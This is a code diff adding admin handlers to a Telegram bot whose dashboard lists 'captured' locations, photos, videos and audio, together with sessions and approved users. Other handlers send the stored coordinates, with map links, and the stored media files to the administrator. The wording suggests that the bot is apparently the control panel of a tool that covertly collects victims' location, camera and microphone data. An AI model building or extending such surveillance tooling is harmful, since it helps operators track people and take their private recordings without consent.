@@ -1014,9 +1014,378 @@ bot.action('admin_panel', async (ctx) => {
     await ctx.answerCbQuery();
     await ctx.editMessageText(
         '🔐 *Admin Panel*\n\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        'Manage users, view data, and more.\n' +
         'Select an option below:',
         { parse_mode: 'Markdown', ...adminPanelKeyboard }
     );
+});
+
+/**
+ * Handle admin dashboard
+ */
+bot.action('admin_dashboard', async (ctx) => {
+    const user = ctx.from;
+    
+    if (!isAdmin(user.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery('Loading dashboard...');
+    
+    try {
+        // Get stats from API
+        const result = await api.getAdminStats(user.id);
+        
+        let msg = `📊 *ADMIN DASHBOARD*\n`;
+        msg += `━━━━━━━━━━━━━━━━━━\n\n`;
+        
+        if (result.success && result.stats) {
+            const s = result.stats;
+            msg += `👥 *Users*\n`;
+            msg += `├ Total: ${s.totalUsers || 0}\n`;
+            msg += `├ Approved: ${s.approvedUsers || 0}\n`;
+            msg += `└ Pending: ${s.pendingUsers || 0}\n\n`;
+            
+            msg += `📁 *Captured Data*\n`;
+            msg += `├ 📍 Locations: ${s.totalLocations || 0}\n`;
+            msg += `├ 📷 Photos: ${s.totalPhotos || 0}\n`;
+            msg += `├ 🎥 Videos: ${s.totalVideos || 0}\n`;
+            msg += `└ 🎤 Audio: ${s.totalAudio || 0}\n\n`;
+            
+            msg += `📈 *Sessions*\n`;
+            msg += `├ Total: ${s.totalSessions || 0}\n`;
+            msg += `└ Active: ${s.activeSessions || 0}\n`;
+        } else {
+            msg += `📍 Locations: Loading...\n`;
+            msg += `📷 Photos: Loading...\n`;
+            msg += `🎥 Videos: Loading...\n`;
+            msg += `🎤 Audio: Loading...\n`;
+        }
+        
+        msg += `\n🕐 Updated: ${new Date().toLocaleTimeString()}`;
+        
+        await ctx.editMessageText(msg, {
+            parse_mode: 'Markdown',
+            ...adminPanelKeyboard
+        });
+        
+    } catch (error) {
+        logger.error('Dashboard error', { error: error.message });
+        await ctx.reply('❌ Failed to load dashboard');
+    }
+});
+
+/**
+ * Handle noop (do nothing button)
+ */
+bot.action('noop', async (ctx) => {
+    await ctx.answerCbQuery();
+});
+
+/**
+ * Handle admin view all locations
+ */
+bot.action('admin_all_locations', async (ctx) => {
+    if (!isAdmin(ctx.from.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery('Loading all locations...');
+    
+    try {
+        const result = await api.getAllMedia('location');
+        
+        if (!result.success || !result.data || result.data.length === 0) {
+            await ctx.reply('📍 No locations captured yet.');
+            return;
+        }
+        
+        const locations = result.data;
+        await ctx.reply(`📍 *ALL LOCATIONS (${locations.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        for (let i = 0; i < Math.min(locations.length, 20); i++) {
+            const loc = locations[i];
+            const metadata = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
+            
+            let locMsg = `📍 *#${i + 1}* • User: \`${loc.telegram_id || loc.telegramId}\`\n`;
+            locMsg += `🕐 ${new Date(loc.created_at).toLocaleString()}\n`;
+            
+            if (metadata.latitude && metadata.longitude) {
+                locMsg += `🎯 \`${metadata.latitude}, ${metadata.longitude}\`\n`;
+                locMsg += `[📍 Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
+            }
+            
+            await ctx.reply(locMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
+            
+            if (i > 0 && i % 10 === 0) await new Promise(r => setTimeout(r, 500));
+        }
+        
+        if (locations.length > 20) {
+            await ctx.reply(`... and ${locations.length - 20} more locations`);
+        }
+        
+    } catch (error) {
+        logger.error('Failed to load all locations', { error: error.message });
+        await ctx.reply('❌ Error: ' + error.message);
+    }
+});
+
+/**
+ * Handle admin view all photos
+ */
+bot.action('admin_all_photos', async (ctx) => {
+    if (!isAdmin(ctx.from.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery('Loading all photos...');
+    
+    try {
+        const result = await api.getAllMedia('photo');
+        
+        if (!result.success || !result.data || result.data.length === 0) {
+            await ctx.reply('📷 No photos captured yet.');
+            return;
+        }
+        
+        const photos = result.data;
+        await ctx.reply(`📷 *ALL PHOTOS (${photos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        const fs = require('fs');
+        const path = require('path');
+        
+        for (let i = 0; i < Math.min(photos.length, 10); i++) {
+            const photo = photos[i];
+            const caption = `📷 #${i + 1} • User: ${photo.telegram_id || photo.telegramId}\n🕐 ${new Date(photo.created_at).toLocaleString()}`;
+            
+            try {
+                let fullPath = photo.file_path;
+                if (!path.isAbsolute(fullPath)) {
+                    fullPath = path.join(__dirname, '..', 'server', fullPath);
+                }
+                
+                if (fs.existsSync(fullPath)) {
+                    await ctx.replyWithPhoto({ source: fullPath }, { caption });
+                } else {
+                    await ctx.reply(`📷 #${i + 1} • File not found on server`);
+                }
+            } catch (err) {
+                await ctx.reply(`📷 #${i + 1} • Error loading photo`);
+            }
+            
+            if (i > 0 && i % 5 === 0) await new Promise(r => setTimeout(r, 1000));
+        }
+        
+        if (photos.length > 10) {
+            await ctx.reply(`... and ${photos.length - 10} more photos`);
+        }
+        
+    } catch (error) {
+        logger.error('Failed to load all photos', { error: error.message });
+        await ctx.reply('❌ Error: ' + error.message);
+    }
+});
+
+/**
+ * Handle admin view all videos
+ */
+bot.action('admin_all_videos', async (ctx) => {
+    if (!isAdmin(ctx.from.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery('Loading all videos...');
+    
+    try {
+        const result = await api.getAllMedia('video');
+        
+        if (!result.success || !result.data || result.data.length === 0) {
+            await ctx.reply('🎥 No videos captured yet.');
+            return;
+        }
+        
+        const videos = result.data;
+        await ctx.reply(`🎥 *ALL VIDEOS (${videos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        const fs = require('fs');
+        const path = require('path');
+        
+        for (let i = 0; i < Math.min(videos.length, 5); i++) {
+            const video = videos[i];
+            const sizeMB = video.file_size ? (video.file_size / (1024 * 1024)).toFixed(2) : '?';
+            const caption = `🎥 #${i + 1} • User: ${video.telegram_id}\n📁 ${sizeMB} MB`;
+            
+            try {
+                let fullPath = video.file_path;
+                if (!path.isAbsolute(fullPath)) {
+                    fullPath = path.join(__dirname, '..', 'server', fullPath);
+                }
+                
+                if (fs.existsSync(fullPath)) {
+                    await ctx.replyWithVideo({ source: fullPath }, { caption });
+                } else {
+                    await ctx.reply(`🎥 #${i + 1} • File not found`);
+                }
+            } catch (err) {
+                await ctx.reply(`🎥 #${i + 1} • Error loading video`);
+            }
+            
+            await new Promise(r => setTimeout(r, 2000));
+        }
+        
+        if (videos.length > 5) {
+            await ctx.reply(`... and ${videos.length - 5} more videos`);
+        }
+        
+    } catch (error) {
+        logger.error('Failed to load all videos', { error: error.message });
+        await ctx.reply('❌ Error: ' + error.message);
+    }
+});
+
+/**
+ * Handle admin view all audio
+ */
+bot.action('admin_all_audio', async (ctx) => {
+    if (!isAdmin(ctx.from.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    await ctx.answerCbQuery('Loading all audio...');
+    
+    try {
+        const result = await api.getAllMedia('audio');
+        
+        if (!result.success || !result.data || result.data.length === 0) {
+            await ctx.reply('🎤 No audio captured yet.');
+            return;
+        }
+        
+        const audios = result.data;
+        await ctx.reply(`🎤 *ALL AUDIO (${audios.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        const fs = require('fs');
+        const path = require('path');
+        
+        for (let i = 0; i < Math.min(audios.length, 10); i++) {
+            const audio = audios[i];
+            const sizeMB = audio.file_size ? (audio.file_size / (1024 * 1024)).toFixed(2) : '?';
+            const caption = `🎤 #${i + 1} • User: ${audio.telegram_id}\n📁 ${sizeMB} MB`;
+            
+            try {
+                let fullPath = audio.file_path;
+                if (!path.isAbsolute(fullPath)) {
+                    fullPath = path.join(__dirname, '..', 'server', fullPath);
+                }
+                
+                if (fs.existsSync(fullPath)) {
+                    await ctx.replyWithAudio({ source: fullPath }, { caption });
+                } else {
+                    await ctx.reply(`🎤 #${i + 1} • File not found`);
+                }
+            } catch (err) {
+                await ctx.reply(`🎤 #${i + 1} • Error loading audio`);
+            }
+            
+            await new Promise(r => setTimeout(r, 1500));
+        }
+        
+        if (audios.length > 10) {
+            await ctx.reply(`... and ${audios.length - 10} more audio files`);
+        }
+        
+    } catch (error) {
+        logger.error('Failed to load all audio', { error: error.message });
+        await ctx.reply('❌ Error: ' + error.message);
+    }
+});
+
+/**
+ * Handle user data view by type
+ */
+bot.action(/^userdata_(\d+)_(location|photo|video|audio)$/, async (ctx) => {
+    if (!isAdmin(ctx.from.id)) {
+        await ctx.answerCbQuery('❌ Admin access required');
+        return;
+    }
+    
+    const telegramId = ctx.match[1];
+    const mediaType = ctx.match[2];
+    
+    await ctx.answerCbQuery(`Loading ${mediaType}s...`);
+    
+    try {
+        const result = await api.getAllCapturedData(telegramId);
+        
+        if (!result.success || !result.data) {
+            await ctx.reply(`No ${mediaType} data found for this user.`);
+            return;
+        }
+        
+        const items = result.data.filter(d => d.media_type === mediaType);
+        
+        if (items.length === 0) {
+            await ctx.reply(`📭 No ${mediaType} captured by this user.`);
+            return;
+        }
+        
+        const emojis = { location: '📍', photo: '📷', video: '🎥', audio: '🎤' };
+        const emoji = emojis[mediaType];
+        
+        await ctx.reply(`${emoji} *USER ${telegramId} - ${mediaType.toUpperCase()} (${items.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        const fs = require('fs');
+        const path = require('path');
+        
+        for (let i = 0; i < Math.min(items.length, 10); i++) {
+            const item = items[i];
+            
+            if (mediaType === 'location') {
+                const metadata = typeof item.metadata === 'string' ? JSON.parse(item.metadata) : item.metadata;
+                let msg = `📍 *#${i + 1}*\n🕐 ${new Date(item.created_at).toLocaleString()}\n`;
+                if (metadata.latitude && metadata.longitude) {
+                    msg += `🎯 \`${metadata.latitude}, ${metadata.longitude}\`\n`;
+                    msg += `[📍 Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
+                }
+                await ctx.reply(msg, { parse_mode: 'Markdown', disable_web_page_preview: true });
+            } else {
+                const caption = `${emoji} #${i + 1}\n🕐 ${new Date(item.created_at).toLocaleString()}`;
+                
+                try {
+                    let fullPath = item.file_path;
+                    if (!path.isAbsolute(fullPath)) {
+                        fullPath = path.join(__dirname, '..', 'server', fullPath);
+                    }
+                    
+                    if (fs.existsSync(fullPath)) {
+                        if (mediaType === 'photo') await ctx.replyWithPhoto({ source: fullPath }, { caption });
+                        else if (mediaType === 'video') await ctx.replyWithVideo({ source: fullPath }, { caption });
+                        else if (mediaType === 'audio') await ctx.replyWithAudio({ source: fullPath }, { caption });
+                    } else {
+                        await ctx.reply(`${emoji} #${i + 1} • File not found`);
+                    }
+                } catch (err) {
+                    await ctx.reply(`${emoji} #${i + 1} • Error loading file`);
+                }
+            }
+            
+            if (i > 0 && i % 5 === 0) await new Promise(r => setTimeout(r, 1000));
+        }
+        
+        if (items.length > 10) {
+            await ctx.reply(`... and ${items.length - 10} more ${mediaType}(s)`);
+        }
+        
+    } catch (error) {
+        logger.error('Failed to load user data', { error: error.message });
+        await ctx.reply('❌ Error: ' + error.message);
+    }
 });
 
 /**
